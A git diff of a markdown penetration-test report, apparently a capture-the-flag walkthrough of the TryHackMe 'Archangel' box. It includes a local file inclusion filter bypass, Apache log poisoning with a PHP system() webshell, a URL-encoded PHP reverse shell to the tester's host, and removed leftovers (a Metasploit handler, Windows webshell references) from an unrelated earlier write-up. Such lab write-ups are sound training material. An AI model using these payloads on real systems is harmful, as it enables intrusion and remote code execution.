@@ -75,7 +75,7 @@ The specific IP addresses were:
 
 **Exam Network**
 
-Host: 10.10.10.5
+Host: variable
 
 ## Sample Report - Service Enumeration
 
@@ -108,13 +108,248 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 On browsing the main website we see the following page:
 
+![ImgPlaceholder](screenshots/80-main-web.png)
 
-upload the webshell:
+In the source code we find a template is used from https://www.os-templates.com/. A web page featuring a comment posting form is found on /pages/full-width.html, but no action is performed by the POST request.
 
+![ImgPlaceholder](screenshots/post-request.png)
 
+We find the support email, and we add the mafialive.thm to the /etc/hosts file
+
+Using gobuster we find several webpages and webdirectories:
+
+```
+$ gobuster dir -u http://10.10.42.162 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o gobuster/archangel-raft-medium.log
+/images (Status: 301)
+/pages (Status: 301)
+/layout (Status: 301)
+/flags (Status: 301)
+/server-status (Status: 403)
+```
+
+The Flags directory features a clickbait redirecting to a rickroll video on Youtube.
+
+![ImgPlaceholder](screenshots/flag-rickroll.png)
+
+We enumerate the other directories:
+
+```
+$ gobuster dir -u http://10.10.42.162/images -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o gobuster/images-raft-medium.log
+/demo (Status: 301)
 ```
 
 ```
+$ gobuster dir -u http://10.10.42.162/images/demo -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o gobuster/images-demo-raft-medium.log
+/gallery (Status: 301)
+/backgrounds (Status: 301)
+```
+
+Also we enumerate the virtual hosts:
+
+```
+$ gobuster dir -u http://mafialive.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -o gobuster/mafialive-raft-files.log 
+/index.html (Status: 200)
+/.htaccess (Status: 403)
+/test.php (Status: 200)
+/robots.txt (Status: 200)
+/. (Status: 200)
+/.html (Status: 403)
+/.php (Status: 403)
+/.htpasswd (Status: 403)
+/.htm (Status: 403)
+/.htpasswds (Status: 403)
+/.htgroup (Status: 403)
+/wp-forum.phps (Status: 403)
+/.htaccess.bak (Status: 403)
+/.htuser (Status: 403)
+/.ht (Status: 403)
+/.htc (Status: 403)
+```
+
+We also try wavefire.thm:
+
+```
+$ gobuster dir -u http://wavefire.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -o gobuster/wavefire-raft-files.log
+/index.html (Status: 200)
+/.htaccess (Status: 403)
+/. (Status: 200)
+/.html (Status: 403)
+/.php (Status: 403)
+/.htpasswd (Status: 403)
+/.htm (Status: 403)
+/.htpasswds (Status: 403)
+/licence.txt (Status: 200)
+/.htgroup (Status: 403)
+/wp-forum.phps (Status: 403)
+/.htaccess.bak (Status: 403)
+/.htuser (Status: 403)
+/.htc (Status: 403)
+/.ht (Status: 403)
+```
+
+The robots.txt shows us the test.php is forbidden to crawl, so we check it:
+
+```
+User-agent: *
+Disallow: /test.php
+```
+
+![ImgPlaceholder](screenshots/test-php.png)
+
+Pushing the button shows also the message 'Control is an illusion', and we find an additional web path attached in a GET view parameter:
+
+![ImgPlaceholder](screenshots/test-php-button-pressed.png)
+
+If we however set the web path to /etc/passwd we get a rejection:
+
+![ImgPlaceholder](screenshots/test-php-not-allowed.png)
+
+However we are able to use php filter convert to convert the code in base64 and decode it on a command prompt:
+
+![ImgPlaceholder](screenshots/php-convert.png)
+
+```
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
+
+$ echo 'PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==' | base64 -d
+<?php echo 'Control is an illusion'; ?>
+```
+
+It becomes really interesting when we use this method to check the test.php code:
+
+```
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+
+$ echo 'CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw-cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==' | base64 -d > test.php
+
+$ cat test.php
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>INCLUDE</title>
+    <h1>Test Page. Not to be Deployed</h1>
+ 
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+        <?php
+
+            //FLAG: thm{explo1t1ng_lf1}
+
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+            if(isset($_GET["view"])){
+            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
+                include $_GET['view'];
+            }else{
+
+                echo 'Sorry, Thats not allowed';
+            }
+        }
+        ?>
+    </div>
+</body>
+
+</html>
+```
+
+In the source code we can see why the request to /etc/passwd was rejected: it rejects when the string '../..' was detected or the string '/var/www/html/development_testing' was missing. We can easily bypass this using '..//..' and appends those after the '/var/www/html/development_testing' string. 
+
+![ImgPlaceholder](screenshots/etc-passwd.png)
+
+We can also access the web logs, opening the possibility to log poisoning:
+
+![ImgPlaceholder](screenshots/log-access.png)
+
+We open a terminal and open with nc a connection to port 80 on the webserver of the victim host, and we type:
+
+```
+$ nc 10.10.102.133 80
+GET /<?php phpinfo(); ?>
+HTTP/1.1 400 Bad Request
+Date: Sat, 06 Feb 2021 13:04:38 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Content-Length: 301
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</h1>
+<p>Your browser sent a request that this server could not understand.<br />
+</p>
+<hr>
+<address>Apache/2.4.29 (Ubuntu) Server at localhost Port 80</address>
+</body></html>
+```
+
+![ImgPlaceholder](screenshots/nc-log-poisoning-result1.png)
+
+```
+$ nc 10.10.102.133 80
+GET <?php system($_GET[command]); ?>
+HTTP/1.1 400 Bad Request
+Date: Sat, 06 Feb 2021 13:08:25 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Content-Length: 301
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</h1>
+<p>Your browser sent a request that this server could not understand.<br />
+</p>
+<hr>
+<address>Apache/2.4.29 (Ubuntu) Server at localhost Port 80</address>
+</body></html>
+```
+
+By doing this we added a small php script in the log that can be interpreted and we can execute OS commands using the command GET parameter:
+
+![ImgPlaceholder](screenshots/log-poisoning-whoami.png)
+
+Now we can use a reverse shell, encode it to URL encoding and pass it using the command GET parameter:
+
+```
+php -r '$sock=fsockopen("10.9.4.36",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+url encoded:
+
+%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%30%2e%39%2e%34%2e%33%36%22%2c%34%34%34%34%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27
+
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&command=%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%30%2e%39%2e%34%2e%33%36%22%2c%34%34%34%34%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27
+```
+
+We open a NetCat on our host on port 4444 to receive the reverse shell:
+
+![ImgPlaceholder](screenshots/reverse-shell.png)
+
+```
+$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.9.4.36] from (UNKNOWN) [10.10.102.133] 58974
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ cd /home
+$ ls -l
+total 4
+drwxr-xr-x 6 archangel archangel 4096 Nov 20 15:22 archangel
+$ cd archangel
+$ ls
+myfiles
+secret
+user.txt
+$ cat user.txt
+thm{xxxxxxxxxxxxx}
+```
+
+We open a webserver on port 8000 on our host with a linpeas.sh script on the root directory, and we download linpeas.sh on the victim host:
 
 ```
 $ python3 -m http.server 8000   
@@ -123,13 +358,8 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 We give execute permission to linpeas.sh and execute it:
 
-
 ![ImgPlaceholder](screenshots/download-execute-linpeas.png)
 ```
-
-```
-
-
 
 ```
 $ cat /opt/helloworld.sh
@@ -236,64 +466,8 @@ ftp> dir
 ftp> 
 ```
 
-We start Metasploit and open a meterpreter handler connecting on port 4444: 
 
 ```
-user@kali:~/hackthebox/hackthebox/devel$ sudo msfdb run
-[sudo] password for user: 
-[+] Starting database
-                                                  
-     ,           ,
-    /             \
-   ((__---,,,---__))
-      (_) O O (_)_________
-         \ _ /            |\
-          o_o \   M S F   | \
-               \   _____  |  *
-                |||   WW|||
-                |||     |||
-
-
-       =[ metasploit v6.0.21-dev                          ]
-+ -- --=[ 2086 exploits - 1126 auxiliary - 354 post       ]
-+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
-+ -- --=[ 7 evasion                                       ]
-
-Metasploit tip: Tired of setting RHOSTS for modules? Try 
-globally setting it with setg RHOSTS x.x.x.x
-
-msf6 > use multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > options
-
-Module options (exploit/multi/handler):
-
-   Name  Current Setting  Required  Description
-   ----  ---------------  --------  -----------
-
-
-Payload options (generic/shell_reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST                   yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Wildcard Target
-
-
-msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
-payload => windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set lhost tun0
-lhost => 10.10.14.27
-msf6 exploit(multi/handler) > run
-
-[*] Started reverse TCP handler on 10.10.14.27:4444 
 ```
 
 We find the winPEAS.bat and the reverse.exe files when we check the directory C:\inetpub\wwwroot with the webshell:
